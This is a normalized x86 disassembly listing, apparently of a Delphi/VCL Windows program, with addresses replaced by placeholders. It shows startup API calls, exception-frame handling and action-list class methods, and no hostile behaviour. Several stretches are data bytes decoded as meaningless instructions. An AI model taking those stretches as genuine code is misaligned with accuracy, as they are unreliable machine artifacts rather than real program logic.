mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_40905c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40405c
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044c8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a6d4
mov [ rw-data ] eax
call sub_44dd94
mov dl 0x1
mov eax [ r-xdata ]
call sub_44dbbc
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ffd4
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4610b8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_462d48
mov ecx r-xdata
mov edx sub_43fcc8
mov eax [ r-xdata ]
call sub_419e30
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e30f
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44e378
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e3d7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e3de
retn
mov eax rw-data
call sub_40d524
call sub_44e108
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404abc
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
sub_44e3e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44e466
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e46d
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44e190
mov eax [ r-xdata ]
call sub_419ca4
mov eax [ r-xdata ]
call sub_419d44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
sub_44e4d3
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
adc [ edx ] eax
cmp [ ecx ] dl
inc edx
add ah cl
adc [ edx ] al
cld
adc [ edx ] al
rcl [ eax ] 0x1
inc edx
add [ ebp + ebp * 8 + 0x44 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
pop eax
add [ eax ] al
add [ eax + eax ] al
clc
inc edx
add [ eax + 0x3000420e ] bh
adc [ edx ] al
xchg esp eax
sub_44e52f
add [ eax ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x4800408d
in eax 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
jae r-xdata
outsb
je r-xdata
push esp
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
ror [ edi + 0x30041 ] 0x8
add [ edx + ecx - 0x559bffbe ] cl
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
inc edx
popad
jae r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x10cc0001
inc eax
add [ eax ] bl
add bh bh
je r-xdata
inc esp
add ah dl
jmp sub_44e5c2
out dx eax
inc esp
add ah dh
out dx al
inc esp
add [ eax + eax ] al
std
inc edx
add [ eax - 0x5bffbdf2 ] bh
in eax dx
inc esp
add [ eax - 0xbffbb11 ] bh
inc esp
add [ ebx + ecx + 0x42 ] dh
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
out dx eax
jo r-xdata
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ edi + ebp * 8 ] dh
or al [ edx ]
stosb [ edi ]
outsb
inc ebp
outsb
popad
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x35ffbb1a ] dh
out 0x44 al
add [ eax ] ch
add [ eax ] al
xor al 0x8d
inc ecx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x104526a6
out dx al
inc esp
add [ eax - 0x55 ] cl
inc ecx
sub_44e5c2
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add al al
pop [ ecx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
add edx [ eax ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bl
in eax 0x44
add [ eax ] cl
popad
jae r-xdata
out 0x44 al
add [ eax ] ch
add [ eax ] al
xor al 0x8d
inc ecx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x104526a6
out dx al
outsd
jb r-xdata
out dx eax
inc esp
add ah dh
out dx al
inc esp
add [ eax + eax ] al
std
inc edx
add [ eax - 0x5bffbdf2 ] bh
in eax dx
inc esp
add [ eax - 0xbffbb11 ] bh
inc esp
add [ eax - 0x55 ] cl
inc ecx
add [ edx + ecx - 0x559bffbe ] cl
add al ch
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ edi + ebp * 8 ] dh
or al [ edx ]
stosb [ edi ]
jo r-xdata
xor [ eax ] eax
adc dh ch
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
inc esp
add [ ebx + ecx + 0x42 ] dh
add [ esp + ecx + 0x42 ] ch
add [ eax - 0x7bffbdf2 ] dh
or eax [ edx ]
jl r-xdata
out dx eax
jo r-xdata
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x35ffbb1a ] dh
sub_44e7e9
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
push 0x4000417a
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
xchg esp eax
in eax 0x44
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17 ] bh
inc esp
add [ eax ] dh
add [ eax ] al
add al al
test [ ecx ] al
jl r-xdata
arpl [ ebp + 0x74 ] si
push 0x6000417a
add [ eax ] al
jmp [ eax ]
inc ecx
add [ ecx + eax * 8 ] bh
inc ecx
add [ eax ] dl
mov dh 0x41
add [ eax + 0xc0041c2 ] dh
retn
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x5845290e
mov esi 0xab480041
inc ecx
add [ ebx + esi * 4 ] ch
inc ecx
add [ edx + esi * 4 ] ah
inc ecx
add [ eax ] al
rol [ ecx ] 0x34
rol [ ecx ] 0x38
rol [ ecx ] 0x3c
rol [ ecx ] 0x10
sub_44e898
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx gs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17 ] bh
inc esp
add [ eax ] dh
add [ eax ] al
add al al
test [ ecx ] al
jl r-xdata
inc ecx
add [ ecx + eax * 8 ] bh
inc ecx
add [ eax ] dl
mov dh 0x41
add [ eax + 0xc0041c2 ] dh
retn
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x5845290e
mov esi 0xab480041
inc ecx
add [ ebx + esi * 4 ] ch
inc ecx
add [ edx + esi * 4 ] ah
inc ecx
add [ eax ] al
rol [ ecx ] 0x34
rol [ ecx ] 0x38
rol [ ecx ] 0x3c
rol [ ecx ] 0x10
sub_44ea76
out dx eax
inc [ eax - 0x8 ]
inc esp
add [ eax - 0x8 ] ch
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add ah cl
xor [ eax ] eax
call 0xffffffff84452b32
cmovb eax [ eax ]
or [ edi ] 0x42
add [ eax + 0x1800420f ] bh
adc [ edx ] al
in al dx
cmovb eax [ eax ]
sbb al 0x10
inc edx
add [ edi + ecx ] bh
inc edx
add al dl
cmovb eax [ eax ]
and al 0x10
inc edx
add [ ecx + esi * 8 - 0xe5fffbc ] cl
inc esp
add [ ecx + esi * 8 - 0xe37ffbc ] dh
inc esp
add ah bl
int1
inc esp
add al dh
int1
inc esp
add [ edx + esi * 8 ] al
inc esp
add [ eax ] bl
inc esp
add [ edx + esi * 8 ] ch
inc esp
add [ eax - 0xe ] al
inc esp
add [ edx + esi * 8 + 0x44 ] dl
add [ eax - 0xe ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax - 0xe ] ah
inc esp
add [ edx + esi * 8 + 0x44 ] ah
add [ eax - 0xe ] ch
inc esp
add [ edx + esi * 8 + 0x44 ] ch
add [ eax - 0xe ] dh
inc esp
add [ edx + esi * 8 + 0x44 ] dh
add [ eax - 0xe ] bh
inc esp
add [ edx + esi * 8 + 0x44 ] bh
add [ eax + 0xb0044f2 ] al
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x31e85653
dec edx
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
xchg esp eax
0xd070044 0x4354
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421074
test bl bl
jle r-xdata
mov edx esi
call sub_44ef9c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44eabc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0x44 ] bh
add [ eax ] bl
add [ eax ] al
add [ esi + ecx * 4 + 0x347c0041 ] dl
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff84452b32
cmovb eax [ eax ]
or [ edi ] 0x42
add [ eax + 0x1800420f ] bh
adc [ edx ] al
in al dx
cmovb eax [ eax ]
sbb al 0x10
inc edx
add [ edi + ecx ] bh
inc edx
add al dl
cmovb eax [ eax ]
and al 0x10
inc edx
add [ ecx + esi * 8 - 0xe5fffbc ] cl
inc esp
add [ ecx + esi * 8 - 0xe37ffbc ] dh
inc esp
add ah bl
int1
inc esp
add al dh
int1
inc esp
add [ edx + esi * 8 ] al
inc esp
add [ eax ] bl
inc esp
add [ edx + esi * 8 ] ch
inc esp
add [ eax - 0xe ] al
inc esp
add [ edx + esi * 8 + 0x44 ] dl
add [ eax - 0xe ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax - 0xe ] ah
inc esp
add [ edx + esi * 8 + 0x44 ] ah
add [ eax - 0xe ] ch
inc esp
add [ edx + esi * 8 + 0x44 ] ch
add [ eax - 0xe ] dh
inc esp
add [ edx + esi * 8 + 0x44 ] dh
add [ eax - 0xe ] bh
inc esp
add [ edx + esi * 8 + 0x44 ] bh
add [ eax + 0xb0044f2 ] al
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x31e85653
dec edx
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
inc esp
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421074
test bl bl
jle r-xdata
mov edx esi
call sub_44ef9c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44eb88
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421074
test bl bl
jle r-xdata
mov edx esi
call sub_44ef9c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44ebf8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420b74
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44eca0
sub_44ec2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ebbc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a358
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41a4e4
sub_44ec74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40405c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44eca0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44ef9c
mov edx ebx
mov eax esi
call sub_44ef7c
sub_44ecc8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44eca0
sub_44ecf4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463b14
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403430
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421100
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43faf4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ed4c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463b3c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403430
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42111c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43faf4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44eda4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44ef28
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44ee10
push ebx
push esi
push edi
call sub_4035c0
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403234
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a550
call sub_403234
mov eax [ edi + 0x30 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_44ee60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44eea8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a4c4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov edx edi
call sub_44ec2c
sub_44eef4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_450798
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_4507dc
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4207e4
sub_44ef34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_44ef9c
sub_44ef7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a30c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4207e4
pop esi
pop ebx
retn
sub_44ef9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a604
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_44efb8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44f020
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_4598f4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_452034
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f8c8
mov edx ebp
call sub_44f928
inc eax
je r-xdata
sub_44f0ac
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44f0cc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44f0ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44f53c
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44f53c
sub_44f284
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421030
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44f2d8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403234
mov eax [ esi + 0x9c ]
call sub_403234
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44eb88
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d524
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44f328
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ab48
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_44f3d4
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_44f434
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44f53c
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_44f674
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44f6d4
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_44f730
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_44f794
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f3d4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404414
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_44f434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44f52c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44eeec
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
